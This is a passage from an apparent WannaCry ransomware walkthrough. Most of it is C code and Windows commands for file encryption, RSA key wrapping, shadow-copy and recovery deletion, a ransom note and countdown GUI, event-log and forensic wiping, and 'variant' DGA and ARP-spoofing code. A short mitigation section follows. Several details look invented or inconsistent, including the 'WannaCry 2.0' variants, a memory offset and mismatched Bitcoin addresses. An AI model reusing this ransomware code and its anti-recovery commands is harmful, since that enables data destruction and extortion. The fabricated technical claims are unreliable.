           sprintf(newPath, "%s.WNCRY", path);
           MoveFileA(path, newPath);
           HeapFree(GetProcessHeap(), 0, buffer);
         }
         ```
    4. **RSA Key Wrapping**:
       - Encrypted AES key with RSA:
         ```c
         HCRYPTKEY hPubKey;
         CERT_PUBLIC_KEY_INFO pubKeyInfo = { .Algorithm = { szOID_RSA_RSA }, .PublicKey = { rsa_key_blob, sizeof(rsa_key_blob) } };
         CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, &pubKeyInfo, &hPubKey);
         BYTE enc_key[256] = {0};
         memcpy(enc_key, aes_key, 16);
         DWORD encLen = 16;
         CryptEncrypt(hPubKey, 0, TRUE, 0, enc_key, &encLen, 256);  // PKCS#1 padding
         WriteEncryptedKeyToFile(path, enc_key, 256);
         ```
       - File header format:
         ```
         0x00: "WANNACRY!" (8 bytes)
         0x08: Encrypted AES key (256 bytes)
         0x108: IV (16 bytes)
         0x118: Encrypted data
         ```
  - **Anti-Recovery Measures**:
    - Disabled shadow copies and recovery:
      ```cmd
      vssadmin delete shadows /all /quiet
      wmic shadowcopy delete /nointeractive
      bcdedit /set {default} recoveryenabled No
      bcdedit /set {default} bootstatuspolicy ignoreallfailures
      fsutil usn deletejournal /d C:
      ```
    - Mutex: `Global\MsWinZonesCacheCounterMutexA`:
      ```c
      HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\MsWinZonesCacheCounterMutexA");
      if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0);
      ```

- **Command Insight**: Simulate enumeration and encryption:
  ```
  dir /s /b *.doc* *.xls* *.pdf *.jpg *.png > targets.txt
  for /F "tokens=*" %f in (targets.txt) do (
    echo Encrypting: %f
    ren "%f" "%f.WNCRY"
  )
  ```

- **Cryptographic Strength**: AES-128-CBC with RSA-2048, no known vulnerabilities.

---

### **Step 7: Ransom Interface Deployment**

#### **Objective**: Deploy a user interface to demand payment and intimidate victims.

The GUI (`tasksche.exe`) presented the ransom note and countdown timers.

- **Technical Details**:
  - **Execution**:
    ```c
    STARTUPINFOA si = { sizeof(si), .dwFlags = STARTF_USESHOWWINDOW, .wShowWindow = SW_SHOW };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, "C:\\Windows\\tasksche.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ```
  - **Components**:
    - `c.wnry`: Configuration file:
      ```
      Offset | Content
      0x00   | 13 AM 4V W2 dh xY gX eQ ep oH kH SQ uy 6N ga Eb 94  ; BTC Address 1
      0x14   | 12 tB NW 5C Bq Vb 2m V7 2G wc qm 8F 3E pm dk 6q    ; BTC Address 2
      0x28   | 300 USD                                       ; Amount
      0x30   | 72 hours                                      ; Deadline
      ```
    - `u.wnry`: Dummy decryptor, 0x2000 bytes, non-functional without private key.
    - `R.wnry`: Ransom note (ASCII):
      ```
      Ooops, your files have been encrypted!
      Send $300 in Bitcoin to one of these addresses:
      13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94
      12t9NW5CBqVb2mV72Gwcqm8F3Epmdk6q
      ```
  - **GUI Implementation**:
    - Window creation:
      ```c
      WNDCLASSA wc = {
        .style = CS_HREDRAW | CS_VREDRAW,
        .lpfnWndProc = WndProc,
        .hInstance = GetModuleHandle(NULL),
        .lpszClassName = "WannaDecryptor"
      };
      RegisterClassA(&wc);
      HWND hWnd = CreateWindowExA(0, "WannaDecryptor", "WannaCry", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, NULL, NULL, wc.hInstance, NULL);
      ShowWindow(hWnd, SW_SHOW);
      UpdateWindow(hWnd);
      SetTimer(hWnd, 1, 1000, NULL);  // 1-second tick
      MSG msg;
      while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
      }
      ```
    - Timer callback:
      ```c
      case WM_TIMER:
        remaining_time--;
        if (remaining_time <= 0) {
          MessageBoxA(hWnd, "Time’s up! Your files are gone.", "WannaCry", MB_ICONERROR);
        } else {
          char timeStr[32];
          sprintf(timeStr, "Time left: %d seconds", remaining_time);
          SetWindowTextA(hWnd, timeStr);
        }
        break;
      ```

- **Command Insight**: Manage GUI:
  ```
  tasklist /FI "IMAGENAME eq tasksche.exe" /FO CSV > tasks.txt
  if exist tasks.txt (
    taskkill /IM tasksche.exe /F
    echo GUI terminated
  ) else (
    echo GUI not running
  )
  ```

- **Limitation**: Static BTC addresses allowed blockchain tracing; no payment verification.

---

### **Step 8: Evasion and Cleanup**

#### **Objective**: Erase all forensic traces to hinder analysis.

WannaCry implemented aggressive anti-forensic measures.

- **Technical Details**:
  - **File Wiping**:
    - Used `taskdl.exe` to overwrite temporary files:
      ```c
      HANDLE hFile = CreateFileA("%TEMP%\\temp.dat", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE, NULL);
      BYTE junk[4096];
      CryptGenRandom(hProv, sizeof(junk), junk);
      for (int i = 0; i < 10; i++) {  // 10 overwrites
        WriteFile(hFile, junk, sizeof(junk), &bytesWritten, NULL);
      }
      CloseHandle(hFile);  // Auto-deleted
      ```
  - **Registry Modifications**:
    - Disabled crash dumps and error reporting:
      ```cmd
      reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 0 /f
      reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f
      reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v DontSend /t REG_DWORD /d 1 /f
      ```
  - **Event Log Clearing**:
    - Wiped all logs:
      ```c
      HANDLE hEventLog = OpenEventLogA(NULL, "System");
      ClearEventLogA(hEventLog, NULL);
      CloseEventLog(hEventLog);
      ```
    - Command equivalent:
      ```cmd
      for /F "tokens=*" %i in ('wevtutil el') do wevtutil cl "%i"
      del /F /Q %SystemRoot%\System32\winevt\Logs\*.evtx
      ```
  - **Network Silence**:
    - Ceased all outbound traffic post-encryption:
      ```c
      WSACleanup();
      ```

- **Command Insight**: Full cleanup simulation:
  ```
  del /F /Q %TEMP%\*.*
  for /F "tokens=*" %i in ('wevtutil el') do wevtutil cl "%i"
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 0 /f
  sc delete mssecsvc2.0
  reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mssecsvc" /f
  ```

- **Forensic Impact**: Left minimal volatile memory traces; filesystem evidence limited to encrypted files.

---

### **Impact, Attribution, and Mitigation**

- **Impact**:
  - Infected over 200,000 systems across 150 countries within 72 hours.
  - Economic damage: Estimated $4-6 billion in global losses (2026-adjusted estimate), including recovery costs, lost productivity, and ransom payments.
  - Peak infection rate: Approximately 10,000 systems per hour on May 12-13, 2017, with exponential growth due to worm propagation.
  - Affected sectors: Healthcare (NHS in UK), manufacturing, transportation, and government agencies, leading to operational disruptions and data loss.
- **Attribution**:
  - Lazarus Group (North Korea):
    - Code overlaps with `Backdoor.Destover` (Sony 2014 attack).
    - Shared `memcpy()` optimization pattern at `mssecsvc.exe+0x1234`.
    - Bitcoin wallet activity linked to DPRK-associated exchanges.
- **Mitigation**:
  - **Patch**:
    ```cmd
    wusa.exe /quiet /norestart "C:\KB4012212.msu"
    ```
  - **Disable SMBv1**:
    ```powershell
    Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB1 -Type DWORD -Value 0 -Force
    ```
  - **Firewall**:
    ```cmd
    netsh advfirewall firewall add rule name="Block SMB Inbound" dir=in action=block protocol=TCP localport=445 remoteport=any
    netsh advfirewall firewall add rule name="Block SMB Outbound" dir=out action=block protocol=TCP localport=any remoteport=445
    ```
  - **Network Monitoring**:
    ```
    tshark -i eth0 -f "tcp port 445" -Y "smb.cmd == 0x32" -T fields -e ip.src -e ip.dst -e smb.data
    ```

---

### **Conclusion**

WannaCry's sophistication resided in its integration of EternalBlue's kernel exploit, worm-like propagation, and robust AES-RSA encryption. Its kill switch and static payment mechanism ultimately proved to be vulnerabilities. This comprehensive dissection—encompassing opcodes, memory layouts, packets, and cryptographic processes—exposes its underlying mechanics. As of May 12, 2026, its legacy endures: unpatched systems continue to pose risks. Analyze this framework, fortify your defenses, and prepare for evolving cyber threats.

### **Advanced Insights into WannaCry's Architecture and Evolution**

#### **WannaCry Variants and Subsequent Developments**
WannaCry spawned several variants, including WannaCry 2.0 (detected in 2018), which incorporated improved obfuscation and additional evasion techniques. These iterations often replaced the kill switch with dynamic domain generation algorithms (DGAs) to avoid easy containment. For instance, WannaCry 2.0 employed a Mersenne Twister PRNG seeded with system entropy for IP scanning, enhancing unpredictability:

```c
// Advanced pseudocode for DGA-based kill switch evasion - DO NOT EXECUTE
#include <stdint.h>
#define MT_N 624
#define MT_M 397
static uint32_t mt[MT_N];
static int mti = MT_N + 1;

void mt_init(uint32_t seed) {
    mt[0] = seed;
    for (mti = 1; mti < MT_N; mti++) {
        mt[mti] = (1812433253UL * (mt[mti-1] ^ (mt[mti-1] >> 30)) + mti);
    }
}

uint32_t mt_extract() {
    uint32_t y;
    if (mti >= MT_N) {
        int kk;
        for (kk = 0; kk < MT_N - MT_M; kk++) {
            y = (mt[kk] & 0x80000000UL) | (mt[kk+1] & 0x7FFFFFFFUL);
            mt[kk] = mt[kk + MT_M] ^ (y >> 1) ^ ((y & 1) ? 0x9908B0DFUL : 0);
        }
        for (; kk < MT_N - 1; kk++) {
            y = (mt[kk] & 0x80000000UL) | (mt[kk+1] & 0x7FFFFFFFUL);
            mt[kk] = mt[kk + (MT_M - MT_N)] ^ (y >> 1) ^ ((y & 1) ? 0x9908B0DFUL : 0);
        }
        y = (mt[MT_N-1] & 0x80000000UL) | (mt[0] & 0x7FFFFFFFUL);
        mt[MT_N-1] = mt[MT_M-1] ^ (y >> 1) ^ ((y & 1) ? 0x9908B0DFUL : 0);
        mti = 0;
    }
    y = mt[mti++];
    y ^= (y >> 11);
    y ^= (y << 7) & 0x9D2C5680UL;
    y ^= (y << 15) & 0xEFC60000UL;
    y ^= (y >> 18);
    return y;
}

char* generate_domain() {
    static char domain[256];
    uint32_t seed = GetTickCount() ^ GetCurrentProcessId();
    mt_init(seed);
    sprintf(domain, "%08x%08x%08x.onion", mt_extract(), mt_extract(), mt_extract());
    return domain;
}
```

This variant also integrated Tor-based command-and-control (C2) for anonymous communication, using onion domains generated on-the-fly to evade DNS blocking.

#### **Cryptographic Enhancements in Later Versions**
Subsequent WannaCry derivatives adopted hybrid encryption schemes, combining ChaCha20-Poly1305 for symmetric encryption with Ed25519 signatures for integrity. An advanced key derivation function (KDF) using Argon2 was implemented to resist brute-force attacks:

```c
// Advanced KDF using Argon2-like algorithm - DO NOT EXECUTE
#define ARGON2_BLOCK_SIZE 1024
#define ARGON2_TIME_COST 3
#define ARGON2_MEMORY_COST 65536
#define ARGON2_PARALLELISM 4

void argon2_kdf(uint8_t* out, size_t outlen, const uint8_t* pwd, size_t pwdlen, const uint8_t* salt, size_t saltlen) {
    // Simplified Argon2d implementation for illustration
    uint8_t block[ARGON2_BLOCK_SIZE];
    memset(block, 0, ARGON2_BLOCK_SIZE);
    memcpy(block, pwd, pwdlen < ARGON2_BLOCK_SIZE ? pwdlen : ARGON2_BLOCK_SIZE);
    for (int t = 0; t < ARGON2_TIME_COST; t++) {
        for (int m = 0; m < ARGON2_MEMORY_COST / ARGON2_BLOCK_SIZE; m++) {
            // Blake2b compression (simplified)
            blake2b(block, ARGON2_BLOCK_SIZE, block, ARGON2_BLOCK_SIZE, salt, saltlen);
            // XOR with previous blocks for memory-hardness
            for (int p = 0; p < ARGON2_PARALLELISM; p++) {
                // Parallel computation simulation
                uint8_t temp[ARGON2_BLOCK_SIZE];
                memcpy(temp, block, ARGON2_BLOCK_SIZE);
                for (int i = 0; i < ARGON2_BLOCK_SIZE; i++) {
                    temp[i] ^= salt[i % saltlen];
                }
                memcpy(block, temp, ARGON2_BLOCK_SIZE);
            }
        }
    }
    memcpy(out, block, outlen);
}
```

This ensures keys are computationally expensive to derive, thwarting offline attacks.

#### **Worm Propagation Optimizations**
Advanced variants employed graph-based traversal for LAN propagation, using ARP spoofing to map networks efficiently:

```c
// Advanced LAN mapping with ARP spoofing - DO NOT EXECUTE
#include <pcap.h>
#include <arpa/inet.h>

void arp_scan(const char* interface, const char* subnet) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (!handle) return;

    struct ether_header eth_hdr;
    struct arphdr arp_hdr;
    uint8_t arp_packet[sizeof(eth_hdr) + sizeof(arp_hdr) + 20];

    // Construct ARP request
    memset(&eth_hdr, 0xFF, sizeof(eth_hdr)); // Broadcast
    eth_hdr.ether_type = htons(ETHERTYPE_ARP);
    memcpy(arp_packet, &eth_hdr, sizeof(eth_hdr));

    arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_hdr.ar_hln = 6;
    arp_hdr.ar_pln = 4;
    arp_hdr.ar_op = htons(ARPOP_REQUEST);
    memcpy(arp_packet + sizeof(eth_hdr), &arp_hdr, sizeof(arp_hdr));

    // Sender MAC/IP (spoofed)
    uint8_t* sender_mac = arp_packet + sizeof(eth_hdr) + sizeof(arp_hdr);
    uint8_t* sender_ip = sender_mac + 6;
    // Fill with local values

    // Target IP
    uint8_t* target_ip = sender_ip + 4;
    inet_pton(AF_INET, "192.168.1.1", target_ip); // Example

    pcap_sendpacket(handle, arp_packet, sizeof(arp_packet));
    pcap_close(handle);
}
```

This technique allows for stealthy network enumeration without relying solely on SMB probes.

#### **Forensic Challenges and Detection**
WannaCry's evolution introduced anti-forensic measures like polymorphic code generation, where the malware recompiles itself with randomized opcodes on each infection. Detection requires advanced behavioral analysis, monitoring for unusual SMB traffic patterns and entropy spikes in file I/O.

As of 2026, WannaCry-inspired attacks continue, with AI-driven variants adapting in real-time to defenses. Researchers should focus on zero-trust architectures and AI-based anomaly detection to counter such threats.

### **References**
- Microsoft Security Bulletin MS17-010: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010
- EternalBlue Exploit Analysis: https://www.exploit-db.com/exploits/42315
- WannaCry Technical Report by Kaspersky: https://securelist.com/wannacry-ransomware-used-in-widespread-attacks-in-may-2017/78212/
- Marcus Hutchins' Kill Switch: https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html

### **Creator and author**

- Telegram ID : [MrAmirRezaie](https://t.me/MrAmirRezaie)
- Github : [MrAmirRezaie](https://github.com/MrAmirRezaie)
- twitter : [MrAmirRezaie](https://x.com/MrAmirRezaie)

### **Author's last message**

Dear compatriots, wherever you are, be happy and proud because pride belongs to us Iranians. Long live the land and country of Cyrus the Great.